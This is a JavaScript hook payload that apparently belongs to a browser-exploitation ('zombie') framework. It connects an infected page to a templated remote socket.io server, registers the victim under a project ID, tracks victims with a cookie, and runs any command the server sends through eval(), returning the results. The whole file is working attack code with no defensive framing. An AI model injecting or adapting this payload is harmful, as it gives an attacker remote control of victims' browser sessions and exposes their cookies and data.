
$.getScript('//{~socketiourl~}/dist/js/socket.io.js',function(){
    var Koalas,
        bind = function(fn, me){ return function(){ return fn.apply(me, arguments); }; };

    Koalas = (function() {
        function Koalas(name1) {
            this.send = bind(this.send, this);
            this.sell = bind(this.sell, this);
            this.name = name;
        }

        Koalas.prototype.sell = function() {
            return alert("test " + this.name + " !!");
        };

        Koalas.prototype.send = function(plugin_name, data) {
            var getData = {
                plugin_name: plugin_name,
                data: data
            }
            socket.emit('trans_data', getData);
        };

        return Koalas;

    })();

    var data;
    socket = io.connect('//{~socketiourl~}/zombie');
    var cookie = document.cookie;

    window.onbeforeunload = function() {
        socket.emit('disconnect');
    };

    data = {
        'projectID': '{~projectid~}'
    };
    if(cookie.indexOf('__koalaP_') >= 0 ){
        data['pc_socket_id'] = "{~socketcookie~}";
        socket.emit('updateZombieStatus',data);
    }else{
        socket.emit('init', data);
    }
    socket.on('exec', function (data) {
        var callbackData = eval(data);
        socket.emit('callbackExec', callbackData);
    });

    var koalas = new Koalas('test');
